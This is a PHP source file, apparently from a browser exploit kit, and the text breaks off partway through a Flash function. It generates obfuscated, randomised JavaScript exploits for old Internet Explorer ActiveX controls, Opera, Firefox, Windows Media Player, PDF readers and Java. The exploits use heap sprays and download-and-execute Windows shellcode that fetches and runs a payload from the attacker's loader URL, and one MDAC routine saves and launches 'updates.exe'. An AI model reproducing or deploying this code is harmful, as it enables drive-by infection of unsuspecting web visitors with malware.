<?php

function _shellcode($s)
{ global $load;
$spl = "?spl=".$s;
 $O00OOOO0000 = unescape(
"\x33\xC0\x64\x8B\x40\x30\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B".
"\x58\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x58\x3C\x6A\x44\x5A".
"\xD1\xE2\x2B\xE2\x8B\xEC\xEB\x4F\x5A\x52\x83\xEA\x56\x89\x55\x04".
"\x56\x57\x8B\x73\x3C\x8B\x74\x33\x78\x03\xF3\x56\x8B\x76\x20\x03".
"\xF3\x33\xC9\x49\x50\x41\xAD\x33\xFF\x36\x0F\xBE\x14\x03\x38\xF2".
"\x74\x08\xC1\xCF\x0D\x03\xFA\x40\xEB\xEF\x58\x3B\xF8\x75\xE5\x5E".
"\x8B\x46\x24\x03\xC3\x66\x8B\x0C\x48\x8B\x56\x1C\x03\xD3\x8B\x04".
"\x8A\x03\xC3\x5F\x5E\x50\xC3\x8D\x7D\x08\x57\x52\xB8\x33\xCA\x8A".
"\x5B\xE8\xA2\xFF\xFF\xFF\x32\xC0\x8B\xF7\xF2\xAE\x4F\xB8\x65\x2E".
"\x65\x78\xAB\x66\x98\x66\xAB\xB0\x6C\x8A\xE0\x98\x50\x68\x6F\x6E".
"\x2E\x64\x68\x75\x72\x6C\x6D\x54\xB8\x8E\x4E\x0E\xEC\xFF\x55\x04".
"\x93\x50\x33\xC0\x50\x50\x56\x8B\x55\x04\x83\xC2\x7F\x83\xC2\x31".
"\x52\x50\xB8\x36\x1A\x2F\x70\xFF\x55\x04\x5B\x33\xFF\x57\x56\xB8".
"\x98\xFE\x8A\x0E\xFF\x55\x04\x57\xB8\xEF\xCE\xE0\x60\xFF\x55\x04".
$load.$spl);
$O00OOOO0000 = '"'.$O00OOOO0000.'"';
return $O00OOOO0000;
}



//=========================================================// MSIE //=========================================================// 


// <= Office Web Components ActiveX SpreadSheet
function Spreadsheet()
{
$O00OOOOO000 = get_random_string_array(rand(8,20), '20');
$O000000OO = '
       function '. $O00OOOOO000[6] .'()
        {
            var '. $O00OOOOO000[1] .', '. $O00OOOOO000[2] .', '. $O00OOOOO000[3] .';
            
            '. $O00OOOOO000[1] .' = 0x100000;
			var '. $O00OOOOO000[0] .' = ' . _shellcode("Spreadsheet") . ';
			var '. $O00OOOOO000[2] .' = unescape('. $O00OOOOO000[0] .');
            '. $O00OOOOO000[3] .' = unescape("%u0b0c%u0b0C");
            while ('. $O00OOOOO000[3] .'.length < '. $O00OOOOO000[1] .')
                '. $O00OOOOO000[3] .' += '. $O00OOOOO000[3] .';
            '. $O00OOOOO000[4] .' = '. $O00OOOOO000[1] .' - ('. $O00OOOOO000[2] .'.length + 20);        
            '. $O00OOOOO000[3] .' = '. $O00OOOOO000[3] .'.substring(0, '. $O00OOOOO000[4] .');
            '. $O00OOOOO000[5] .' = new Array();
            for (var i = 0 ; i < 100 ; i++)
                '. $O00OOOOO000[5] .'[i] = '. $O00OOOOO000[3] .' + '. $O00OOOOO000[2] .';
        }    
        function '. $O00OOOOO000[7] .'()
        {
            var '. $O00OOOOO000[8] .', '. $O00OOOOO000[9] .';
           
            try {
                '. $O00OOOOO000[8] .' = new ActiveXObject("OWC10.Spreadsheet");
            } catch (err) { 
                try {
                    '. $O00OOOOO000[8] .' = new ActiveXObject("OWC11.Spreadsheet");	
           		} catch (err) {
                   	
           		}
            }
            '. $O00OOOOO000[9] .' = new Array();
            '. $O00OOOOO000[9] .'.push(1);
            '. $O00OOOOO000[9] .'.push(2);
            '. $O00OOOOO000[9] .'.push(0);
            '. $O00OOOOO000[9] .'.push(window);
            for (var i = 0 ; i < '. $O00OOOOO000[9] .'.length ; i++) {
                for (var j = 0 ; j < 10 ; j++) {
                    try {
                        '. $O00OOOOO000[8] .'.Evaluate('. $O00OOOOO000[9] .'[i]);
                    } catch (err) {}
                }
            }        
            window.status = '. $O00OOOOO000[9] .'[3] + "";
            for (var j = 0 ; j < 10 ; j++) {
                try {
                    '. $O00OOOOO000[8] .'.msDataSource('. $O00OOOOO000[9] .'[3]);
                } catch (err) {}
            }
        }
        '. $O00OOOOO000[6] .'();
        '. $O00OOOOO000[7] .'();
		';

return $O000000OO;
}


// <= DirectX 9 - XP,2003 - IE ONLY
function DirectX_DS7()
{
$O00000OOO = get_random_string_array(rand(6,15), '20');
$O000000OO = '
document.write("<div id=\"'. $O00000OOO[9] .'\">");
 
  var '. $O00000OOO[0] .' = ' . _shellcode("DirectX_DS") . ';
  var '. $O00000OOO[1] .' = unescape('. $O00000OOO[0] .');
  var '. $O00000OOO[2] .' = unescape("%u9"+"090%u9"+"09"+"0");
  var '. $O00000OOO[3] .' = 20;
	var '. $O00000OOO[4] .' = '. $O00000OOO[3] .' + '. $O00000OOO[1] .'.length;
	while ('. $O00000OOO[2] .'.length < '. $O00000OOO[4] .') '. $O00000OOO[2] .' += '. $O00000OOO[2] .';
	var '. $O00000OOO[5] .' = '. $O00000OOO[2] .'.substring(0, '. $O00000OOO[4] .');
	var '. $O00000OOO[6] .' = '. $O00000OOO[2] .'.substring(0, '. $O00000OOO[2] .'.length - '. $O00000OOO[4] .');
	while ('. $O00000OOO[6] .'.length + '. $O00000OOO[4] .' < 0x40000) '. $O00000OOO[6] .' = '. $O00000OOO[6] .' + '. $O00000OOO[6] .' + '. $O00000OOO[5] .';
	var '. $O00000OOO[7] .' = new Array();
	for ('. $O00000OOO[8] .' = 0; '. $O00000OOO[8] .' < 350; '. $O00000OOO[8] .'++) { '. $O00000OOO[7] .'['. $O00000OOO[8] .'] = '. $O00000OOO[6] .' + '. $O00000OOO[1] .'}
	var '. $O00000OOO[10] .' = document.createElement(\'object\');
	'. $O00000OOO[9] .'.appendChild('. $O00000OOO[10] .');
	'. $O00000OOO[10] .'.width = \'1\';
	'. $O00000OOO[10] .'.height = \'1\';
	'. $O00000OOO[10] .'.data = \'dx_ds.gif\';
	'. $O00000OOO[10] .'.classid = \'clsid:8A674B4D-1F63-11D3-B64C-00C04F79498E\';	
	';
return $O000000OO;
}
	
// OK  ie7
function mem_cor() 
{
$O0000OOOO = get_random_string_array(rand(8,15), '15');
$O000000OO = '
var '. $O0000OOOO[0] .' = unescape('._shellcode("MS09-002").');
var '. $O0000OOOO[1] .' = new Array(); 
var '. $O0000OOOO[2] .' = 0x100000-('. $O0000OOOO[0] .'.length*2+0x01020); 
var '. $O0000OOOO[4] .' = unescape("%u0C0C%u0C0C"); 
while('. $O0000OOOO[4] .'.length<'. $O0000OOOO[2] .'/2) { '. $O0000OOOO[4] .'+='. $O0000OOOO[4] .';} 
var '. $O0000OOOO[3] .' = '. $O0000OOOO[4] .'.substring(0,'. $O0000OOOO[2] .'/2); 
delete '. $O0000OOOO[4] .'; 
for('. $O0000OOOO[5] .'=0; '. $O0000OOOO[5] .'<0xC0; '. $O0000OOOO[5] .'++) { 
	'. $O0000OOOO[1] .'['. $O0000OOOO[5] .'] = '. $O0000OOOO[3] .' + '. $O0000OOOO[0] .';
} 
CollectGarbage();
var '. $O0000OOOO[6] .'=unescape("%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA");
var '. $O0000OOOO[7] .' = new Array();
for(var '. $O0000OOOO[11] .'=0;'. $O0000OOOO[11] .'<1000;'. $O0000OOOO[11] .'++) '. $O0000OOOO[7] .'.push(document.createElement("img"));
function '. $O0000OOOO[10] .'() { 
	'. $O0000OOOO[8] .'=document.createElement("tbody"); 
	'. $O0000OOOO[8] .'.click; 
	var '. $O0000OOOO[9] .' = '. $O0000OOOO[8] .'.cloneNode();	
	'. $O0000OOOO[8] .'.clearAttributes(); 
	'. $O0000OOOO[8] .'=null; CollectGarbage(); 
	for(var '. $O0000OOOO[11] .'=0;'. $O0000OOOO[11] .'<'. $O0000OOOO[7] .'.length;'. $O0000OOOO[11] .'++) '. $O0000OOOO[7] .'['. $O0000OOOO[11] .'].src='. $O0000OOOO[6] .'; 
	'. $O0000OOOO[9] .'.click;
}
window.setTimeout("'. $O0000OOOO[10] .'();",200);
';

return $O000000OO;
}


//=======================================================
//ok
function mdac() // ie 6 ...
{global $load;
$O000OOOOO = get_random_string_array(rand(10,19), '15');

$O000000OO = '
var '. $O000OOOOO[0] .'=\''.$load.'?spl=mdac\';
function '. $O000OOOOO[1] .'('. $O000OOOOO[7] .','. $O000OOOOO[8] .'){
var '. $O000OOOOO[2] .'=null;
try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.CreateObject('. $O000OOOOO[8] .')}catch(e){}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.CreateObject('. $O000OOOOO[8] .',"")}catch(e){}}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.CreateObject('. $O000OOOOO[8] .',"","")}catch(e){}}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.GetObject("",'. $O000OOOOO[8] .')}catch(e){}}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.GetObject('. $O000OOOOO[8] .',"")}catch(e){}}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.GetObject('. $O000OOOOO[8] .')}catch(e){}}
return('. $O000OOOOO[2] .');
}
function '. $O000OOOOO[3] .'('. $O000OOOOO[9] .'){
'. $O000OOOOO[10] .'="updates.exe";var '. $O000OOOOO[4] .'='. $O000OOOOO[9] .'.CreateObject("Scripting.FileSystemObject","");
var sap='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"Sh"+"e"+"l"+"l.App"+"l"+"ica"+"t"+"i"+"on");
var '. $O000OOOOO[11] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"ADODB.Stream");
var '. $O000OOOOO[5] .'=null;'. $O000OOOOO[10] .'='. $O000OOOOO[4] .'.BuildPath('. $O000OOOOO[4] .'.GetSpecialFolder(2),'. $O000OOOOO[10] .');'. $O000OOOOO[11] .'.Mode=3;
try{'. $O000OOOOO[5] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"Mic"+"ro"+"so"+"ft.XM"+"LH"+"T"+"TP");'. $O000OOOOO[5] .'.open("G"+"ET",'. $O000OOOOO[0] .',false);}
catch(e){try{'. $O000OOOOO[5] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"MSX"+"M"+"L2.XML"+"HT"+"TP");'. $O000OOOOO[5] .'.open("GE"+"T",'. $O000OOOOO[0] .',false);}
catch(e){try{'. $O000OOOOO[5] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"M"+"SX"+"ML2.Se"+"rv"+"erX"+"MLHT"+"TP");'. $O000OOOOO[5] .'.open("GET",'. $O000OOOOO[0] .',false);}
catch(e)
{
try
{
'. $O000OOOOO[5] .'=new XMLHttpRequest();
'. $O000OOOOO[5] .'.open("GET",'. $O000OOOOO[0] .',false);
}
catch(e){return 0;}}}}
'. $O000OOOOO[11] .'.Type=1;'. $O000OOOOO[5] .'.send(null);rb='. $O000OOOOO[5] .'.responseBody;'. $O000OOOOO[11] .'.Open();'. $O000OOOOO[11] .'.Write(rb);'. $O000OOOOO[11] .'.SaveTofile('. $O000OOOOO[10] .',2);sap.ShellExecute('. $O000OOOOO[10] .');
return 1;
}
function '. $O000OOOOO[6] .'(){
var '. $O000OOOOO[12] .'=0;
var '. $O000OOOOO[6] .'d=new Array(\'BD96C556-65A3-11D0-983A-00C04FC29E36\',\'BD96C556-65A3-11D0-983A-00C04FC29E30\',\'AB9BCEDD-EC7E-47E1-9322-D4A210617116\',\'0006F033-0000-0000-C000-000000000046\',\'0006F03A-0000-0000-C000-000000000046\',\'6e32070a-766d-4ee6-879c-dc1fa91d2fc3\',\'6414512B-B978-451D-A0D8-FCFDF33E833C\',\'7F5B7F63-F06F-4331-8A26-339E03C0AE3D\',\'06723E09-F4C2-43c8-8358-09FCD1DB0766\',\'639F725F-1B2D-4831-A9FD-874847682010\',\'BA018599-1DB3-44f9-83B4-461454C84BF8\',\'D0C07D56-7C69-43F1-B4A0-25F5A11FAB19\',\'E8CCCDDF-CA28-496b-B050-6C07C962476B\',null);
while('. $O000OOOOO[6] .'d['. $O000OOOOO[12] .'])
{
var '. $O000OOOOO[9] .'=null;
'. $O000OOOOO[9] .'=document.createElement("object");
'. $O000OOOOO[9] .'.setAttribute("classid","clsid:"+'. $O000OOOOO[6] .'d['. $O000OOOOO[12] .']);
if('. $O000OOOOO[9] .'){try{var '. $O000OOOOO[13] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"S"+"he"+"l"+"l.App"+"lica"+"ti"+"on");
if('. $O000OOOOO[13] .'){if('. $O000OOOOO[3] .'('. $O000OOOOO[9] .'))return 1;}}catch(e){}}
'. $O000OOOOO[12] .'++;
}
}
'. $O000OOOOO[6] .'();

';

return $O000000OO;
}




//=========================================================// Opera //=========================================================// 
function op_telnet()  // 9.0 - 9.21
{global $load;
$O00OOOOOO = get_random_string_array(rand(7,19), '15');
$O000000OO = '
'. $O00OOOOOO[0] .' = document.createElement(\'iframe\');
'. $O00OOOOOO[0] .'.src = \'about:blank\';
'. $O00OOOOOO[0] .'.setAttribute(\'id\', \''. $O00OOOOOO[1] .'\');
'. $O00OOOOOO[0] .'.setAttribute(\'style\', \'display:none\');
document.appendChild('. $O00OOOOOO[0] .');
'. $O00OOOOOO[1] .'.eval
	("'. $O00OOOOOO[2] .' = document.createElement(\'iframe\');\
	'. $O00OOOOOO[2] .'.setAttribute(\'id\', \''. $O00OOOOOO[8] .'\');\
	'. $O00OOOOOO[2] .'.src = \'opera:config\';\
	document.appendChild('. $O00OOOOOO[2] .');\
	'. $O00OOOOOO[3] .' = document.createElement(\'script\');\
	'. $O00OOOOOO[4] .' = document.createElement(\'iframe\');\
	'. $O00OOOOOO[3] .'.src = \''.$load.'?spl=Opera_telnet\';\
	'. $O00OOOOOO[3] .'.onload = function ()\
	{\
		'. $O00OOOOOO[4] .'.src = \'opera:cache\';\
		'. $O00OOOOOO[4] .'.onload = function ()\
		{\
			'. $O00OOOOOO[5] .' = '. $O00OOOOOO[4] .'.contentDocument.childNodes[0].innerHTML.toUpperCase();\
			var '. $O00OOOOOO[6] .' = new RegExp(\'(OPR\\\\\\\\w{5}.EXE)</TD>\\\\\\\\s*<TD>\\\\\\\\d+</TD>\\\\\\\\s*<TD><A HREF=\"\'+'. $O00OOOOOO[3] .'.src.toUpperCase(), \'\');\
			'. $O00OOOOOO[7] .' = '. $O00OOOOOO[5] .'.match('. $O00OOOOOO[6] .');\
			'. $O00OOOOOO[8] .'.eval\
			(\"\
			opera.setPreference(\'Network\',\'TN3270 App\',opera.getPreference(\'User Prefs\',\'Cache Directory4\')+parent.'. $O00OOOOOO[7] .'[1]);\
			'. $O00OOOOOO[9] .' = document.createElement(\'a\');\
			'. $O00OOOOOO[9] .'.setAttribute(\'href\', \'tn3270://nothing\');\
			'. $O00OOOOOO[9] .'.click();\
			setTimeout(function () {opera.setPreference(\'Network\',\'TN3270 App\',\'telnet.exe\')},1000);\
			\");\
		};\
		document.appendChild('. $O00OOOOOO[4] .');\
	};\
	document.appendChild('. $O00OOOOOO[3] .');");
';
return $O000000OO;
}

//=========================================================// Opera //=========================================================// 







//=========================================================// FireFox //=========================================================// 

function compareTo() // Mozilla Firefox <= 1.0.4 compareTo() Remote Code Execution Exploit
{
$O00OOOOOOO = get_random_string_array(rand(8,19), '20');
$O000000OO = '
function '.$O00OOOOOOO[0].'() 
{
location.href="javascript:void (new InstallVersion());";
'.$O00OOOOOOO[1].'();
};
function '.$O00OOOOOOO[1].'() 
{
var '.$O00OOOOOOO[2].'= 0x12000000;
var '.$O00OOOOOOO[3].' = ' . _shellcode("compareTo") . ';
var '.$O00OOOOOOO[4].' = unescape('.$O00OOOOOOO[3].'); 
var '.$O00OOOOOOO[5].'= 0x400000;
var '.$O00OOOOOOO[6].'='.$O00OOOOOOO[4].'.length * 2; 
var '.$O00OOOOOOO[7].'='.$O00OOOOOOO[5].'-('.$O00OOOOOOO[6].'+0x38);
var '.$O00OOOOOOO[8].' = unescape("%u002C%u11C0"); 
'.$O00OOOOOOO[8].' = '.$O00OOOOOOO[10].'('.$O00OOOOOOO[8].','.$O00OOOOOOO[7].'); 
var '.$O00OOOOOOO[9].' = unescape("%u002C%u1200");
'.$O00OOOOOOO[9].' = '.$O00OOOOOOO[10].'('.$O00OOOOOOO[9].','.$O00OOOOOOO[7].');
var '.$O00OOOOOOO[11].' = unescape("%u9090%u9090");
'.$O00OOOOOOO[11].' = '.$O00OOOOOOO[10].'('.$O00OOOOOOO[11].','.$O00OOOOOOO[7].');
'.$O00OOOOOOO[12].'=('.$O00OOOOOOO[2].'-0x400000)/'.$O00OOOOOOO[5].';
'.$O00OOOOOOO[13].' = new Array();
for ('.$O00OOOOOOO[14].'=0;'.$O00OOOOOOO[14].'<'.$O00OOOOOOO[12].';'.$O00OOOOOOO[14].'++) 
{
'.$O00OOOOOOO[13].'['.$O00OOOOOOO[14].']=('.$O00OOOOOOO[14].'%3==0) ? '.$O00OOOOOOO[8].' + '.$O00OOOOOOO[4].': 
('.$O00OOOOOOO[14].'%3==1) ? '.$O00OOOOOOO[9].' + '.$O00OOOOOOO[4].': '.$O00OOOOOOO[11].' + '.$O00OOOOOOO[4].';
}
var '.$O00OOOOOOO[15].' = 0x1180002C;
(new InstallVersion).compareTo(new Number('.$O00OOOOOOO[15].' >> 1));
}
function '.$O00OOOOOOO[10].'('.$O00OOOOOOO[16].', '.$O00OOOOOOO[7].') {
while ('.$O00OOOOOOO[16].'.length*2<'.$O00OOOOOOO[7].') 
{
'.$O00OOOOOOO[16].'+='.$O00OOOOOOO[16].';
}
'.$O00OOOOOOO[16].'='.$O00OOOOOOO[16].'.substring(0,'.$O00OOOOOOO[7].'/2);
return '.$O00OOOOOOO[16].';
}
'.$O00OOOOOOO[0].'();
';

return $O000000OO;
}




//========================================================================================
function jno() //  Mozilla Firefox <= 1.5.0.4 Javascript navigator Object Code Execution PoC
{
$O00OOOOOOO0 = get_random_string_array(rand(8,19), '15');

$O000000OO = '
var '. $O00OOOOOOO0[0] .' = ' . _shellcode("jno") . ';
var '. $O00OOOOOOO0[1] .' = unescape('. $O00OOOOOOO0[0] .');
var '. $O00OOOOOOO0[2] .' = unescape(\'%u0800\');
var '. $O00OOOOOOO0[3] .' = 0x08000800;
var '. $O00OOOOOOO0[4] .';
var '. $O00OOOOOOO0[5] .';
var '. $O00OOOOOOO0[6] .';
var '. $O00OOOOOOO0[7] .' = \'\' + navigator.userAgent;
if ('. $O00OOOOOOO0[7] .'.indexOf(\'Windows\') != -1) 
{
'. $O00OOOOOOO0[4] .' = '. $O00OOOOOOO0[1] .';
'. $O00OOOOOOO0[5] .' = '. $O00OOOOOOO0[3] .';
'. $O00OOOOOOO0[6] .' = '. $O00OOOOOOO0[2] .';
}
var '. $O00OOOOOOO0[8] .' = '. $O00OOOOOOO0[6] .';
while ('. $O00OOOOOOO0[8] .'.length <= 0x400000) '. $O00OOOOOOO0[8] .'+='. $O00OOOOOOO0[8] .';
var '. $O00OOOOOOO0[9] .' = new Array();
for (var '. $O00OOOOOOO0[10] .' =0; '. $O00OOOOOOO0[10] .'<36; '. $O00OOOOOOO0[10] .'++) {
'. $O00OOOOOOO0[9] .'['. $O00OOOOOOO0[10] .'] = 
'. $O00OOOOOOO0[8] .'.substring(0,  0x100000 - '. $O00OOOOOOO0[4] .'.length) + '. $O00OOOOOOO0[4] .' +
'. $O00OOOOOOO0[8] .'.substring(0,  0x100000 - '. $O00OOOOOOO0[4] .'.length) + '. $O00OOOOOOO0[4] .' + 
'. $O00OOOOOOO0[8] .'.substring(0,  0x100000 - '. $O00OOOOOOO0[4] .'.length) + '. $O00OOOOOOO0[4] .' + 
'. $O00OOOOOOO0[8] .'.substring(0,  0x100000 - '. $O00OOOOOOO0[4] .'.length) + '. $O00OOOOOOO0[4] .';
}
if (window.navigator.javaEnabled) {
window.navigator = ('. $O00OOOOOOO0[5] .' / 2);
try {
java.lang.reflect.Runtime.newInstance(
java.lang.Class.forName("java.lang.Runtime"), 0
);
}catch(e){}
}
';
return $O000000OO;
}





//========================================================================================
function wmp() 
{
$O000000OO = '
document.write(\'<SC\'+\'RIPT>ida="%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141";var idsssss = unescape(ida);do {idsssss += idsssss;} while (idsssss.length < 0x1000000);idsssss += unescape(' . _shellcode("MS06-006") . ');</SC\'+\'RIPT><BODY><EMBED SRC="----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&#x41;&#x41;&#x41;&#x41;&#x42;&#x42;&#x42;&#x42;&#x43;&#x43;&#x43;&#x43;&#x44;&#x44;&#x44;&#x44;&#x45;&#x45;&#x45;&#x45;&#x46;&#x46;&#x46;&#x46;&#x47;&#x47;&#x47;&#x47;&#x48;&#x48;&#x48;&#x48;&#x49;&#x49;&#x49;&#x49;&#x4A;&#x4A;&#x4A;&#x4A;&#x4B;&#x4B;&#x4B;&#x4B;&#x4C;&#x4C;&#x4C;&#x4C;&#x41;&#x41;&#x41;&#x05;&#x4E;&#x4E;&#x4E;&#x4E;&#x4F;&#x4F;&#x4F;&#x4F;&#x41;&#x41;&#x41;&#x05;&#x51;&#x51;&#x51;&#x51;&#x52;&#x52;&#x52;&#x52;&#x53;&#x53;&#x53;&#x53;&#x54;&#x54;&#x54;&#x54;&#x55;&#x55;&#x55;&#x55;&#x56;&#x56;&#x56;&#x56;&#x57;&#x57;&#x57;&#x57;&#x58;&#x58;&#x58;&#x58;&#x59;&#x59;&#x59;&#x59;&#x5A;&#x5A;&#x5A;&#x5A;&#x30;&#x30;&#x30;&#x30;&#x31;&#x31;&#x31;&#x31;&#x32;&#x32;&#x32;&#x32;&#x33;&#x33;&#x33;&#x33;&#x34;&#x34;&#x34;&#x34;&#x35;&#x35;&#x35;&#x35;&#x36;&#x36;&#x36;&#x36;&#x37;&#x37;&#x37;&#x37;&#x38;&#x38;&#x38;&#x38;&#x39;&#x39;&#x39;&#x39;.&#x77;&#x6d;&#x76;"></EMBED>\');
';
return $O000000OO;
}




//========================================================================================
function font_tags() //  only Mozilla Firefox == 3.5
{
$O00OOOOOO00 = get_random_string_array(rand(8,19), '15');

$O000000OO = '

<html>
<head>

<div id="'. $O00OOOOOO00[12] .'">
<p>
<FONT>                             
</FONT>
</p>
<p>
<FONT>Loremipsumdoloregkuw</FONT></p>
<p>
<FONT>Loremipsumdoloregkuwiert</FONT>
</p>
<p>
<FONT>Loremikdkw  </FONT>
</p>
</div>

<script language=JavaScript>
var '. $O00OOOOOO00[0] .' = ' . _shellcode("Font_FireFox") . ';
var '. $O00OOOOOO00[1] .' = unescape('. $O00OOOOOO00[0] .');
var '. $O00OOOOOO00[2] .' = unescape("%u0c0c%u0c0c");

while ('. $O00OOOOOO00[2] .'.length<0x60000)  
{
    '. $O00OOOOOO00[2] .' += '. $O00OOOOOO00[2] .';
}
'. $O00OOOOOO00[3] .' = new Array();
for (i=0; i<600; i++)  
{
    '. $O00OOOOOO00[3] .'[i] = '. $O00OOOOOO00[2] .' + '. $O00OOOOOO00[1] .';
}
var '. $O00OOOOOO00[4] .' = new Array()
 
function '. $O00OOOOOO00[5] .'('. $O00OOOOOO00[6] .')
{
 var i;
 var c;
 var '. $O00OOOOOO00[7] .'="";
 for(i=0;i<'. $O00OOOOOO00[6] .'.length;i++)
  {
   c='. $O00OOOOOO00[6] .'.charAt(i);
   if(c=="&" || c=="?" || c=="=" || c=="%" || c==" ") c = escape(c);
   '. $O00OOOOOO00[7] .'+=c;
  }
 return '. $O00OOOOOO00[7] .';
}
 
function '. $O00OOOOOO00[8] .'(){
    '. $O00OOOOOO00[4] .' = new Array();
    '. $O00OOOOOO00[4] .'[0] = new Array();
    '. $O00OOOOOO00[4] .'[0]["str"] = "blah";
    var '. $O00OOOOOO00[10] .' = document.getElementById("'. $O00OOOOOO00[12] .'")
    if (document.getElementsByTagName) {
        var i=0;
        '. $O00OOOOOO00[11] .' = '. $O00OOOOOO00[10] .'.getElementsByTagName("p")
        if ('. $O00OOOOOO00[11] .'.length > 0)  
        while (i<'. $O00OOOOOO00[11] .'.length)
        {
            '. $O00OOOOOO00[13] .' = '. $O00OOOOOO00[11] .'[i].getElementsByTagName("font")
            '. $O00OOOOOO00[4] .'[i+1] = new Array()
            if ('. $O00OOOOOO00[13] .'[0])  
            {
                '. $O00OOOOOO00[4] .'[i+1]["str"] = '. $O00OOOOOO00[13] .'[0].innerHTML;
            }
            i++
        }
    }
}
 
function '. $O00OOOOOO00[9] .'()
{
    var html = "";
    for (i=1;i<'. $O00OOOOOO00[4] .'.length;i++)
    {
        html += '. $O00OOOOOO00[5] .'('. $O00OOOOOO00[4] .'[i]["str"])
    }    
}
'. $O00OOOOOO00[8] .'();
'. $O00OOOOOO00[9] .'()
</script>

';
return $O000000OO;
}



//=========================================================// FireFox //=========================================================// 






//=========================================================// PDF //=========================================================// 
// OK
function pdf_ie()
{
global $pdf,$case_spl;
$pdf_ie_name = get_random_string_array(rand(7,19), '8');
//if ((ver <= "7.1.1") || (ver >= "8.0.0") && (ver <= "8.1.4") || (ver == "9.0.0"))
$O000000OO = '
  document.write("<OBJECT id=jdf1 height=0 width=0 classid=clsid:CA8A9780-280D-11CF-A24D-444553540000></OBJECT>");
    var ver = jdf1.GetVersions();
    ver = ver.split(",");
	ver = ver[1].split("=");
	ver = ver[1];
	if ((ver < "7.1.4") || (ver < "8.1.7") || (ver < "9.2"))
	{
		 document.write(\'<iframe src="'.$pdf.'" width="'.rand(40, 499).'" height="'.rand(40, 499).'" frameborder="0"></iframe>\');
	}  
	else
	{
	setTimeout("dorefresh();",1000);
	}
    	
';
return $O000000OO;
}


function pdf_2()
{
global $pdf;
$O000000OO='
<object height="1" width="1" type="application/pdf" data="'.$pdf.'">
<param name="src" value="1.pdf">
</object>
';

return $O000000OO;
}
// PDF etc
function pdf_all()
{
global $pdf;
$O000000OO = 'document.write("<iframe src=\"'.$pdf.'?spl=pdf_all\" width=\"'.rand(40, 499).'\" height=\"'.rand(40, 499).'\" frameborder=\"0\"></iframe>");';
return $O000000OO;
}
//=========================================================// PDF //=========================================================// 


function activex_pack()
{
global $load,$url;
$O000000OO = '

<object classid="clsid:97AF4A45-49BE-4485-9F55-91AB40F288F2">
<PARAM NAME="OpenWebFile"  VALUE="'.$load.'?spl=ActiveX_pack">
</object>
 <object classid="clsid:97AF4A45-49BE-4485-9F55-91AB40F22B92">
 <PARAM NAME="OpenWebFile"  VALUE="'.$load.'?spl=ActiveX_pack">
 </object>
 <object classid="clsid:97AF4A45-49BE-4485-9F55-91AB40F22BF2">
 <PARAM NAME="OpenWebFile"  VALUE="'.$load.'?spl=ActiveX_pack">
 </object>
 <object classid="clsid:18A295DA-088E-42D1-BE31-5028D7F9B965">
 <PARAM NAME="OpenWebFile"  VALUE="'.$load.'?spl=ActiveX_pack">
 </object>
<object classid="clsid:3356DB7C-58A7-11D4-AA5C-006097314BF8">
<PARAM NAME="installAppMgr"  VALUE="'.$load.'?spl=ActiveX_pack">
</object>
<object classid="clsid:7F9B30F1-5129-4F5C-A76C-CE264A6C7D10">
<PARAM NAME="PerformUpdateAsync"  VALUE="'.$load.'?spl=ActiveX_pack">
</object>
<object classid="clsid:2BCEAECE-6121-4E78-816C-8CD3121361B0">
<PARAM NAME="ExecutePreferredApplication"  VALUE="'.$load.'?spl=ActiveX_pack">
</object>
<OBJECT ID="DownloaderActiveX1" WIDTH="0" HEIGHT="0" CLASSID="CLSID:c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61">
<PARAM NAME="propWidth"  VALUE="0">
<PARAM NAME="propHeight"  VALUE="0">
<PARAM NAME="propDownloadUrl"  VALUE="'.$load.'?spl=ActiveX_pack">
<PARAM NAME="propPostDownloadAction"  VALUE="run">
</OBJECT>


<OBJECT id="sysWIN" WIDTH=1 HEIGHT=1 classid="clsid:BADA82CB-BF48-4D76-9611-78E2C6F49F03" codebase="'.$url.'/Bol.CAB">
</OBJECT>
<script language="vbscript">
sysWIN.url = "'.$load.'?spl=ActiveX_pack"
sysWIN.fontsize = 10
sysWIN.barcolor = 00FF00
sysWIN.start = "start"
</script>

';

return $O000000OO;
}



function java_exec()
{
	global $load;

	$url = $load . "?spl=javar";
	$url = base64_encode($url);

	$O000000OO = '
	<applet code="ghsdr.Jewredd.class" archive="5734.jar" width="150" height="620">
	<param name="data" VALUE="'.$url.'">
	<param name="cc" value="1">
	</applet>
	';

	return $O000000OO;
}




function next_spl($refr)
{
global $O0000000O,$OOOOOO000,$OOOOO0000,$OOOO00000;
$O0000000O++;
$O000000OO = '
function dorefresh(){ 
window.location="?spl='.$O0000000O.'&br='.$OOOOOO000.'&vers='.$OOOOO0000[2].'&s='.$OOOO00000.'"; 
} 
setTimeout("dorefresh();",'.$refr.'000);
';

return $O000000OO;
}



function flash10()
{
global $url;
$content ='
function flash_version(){
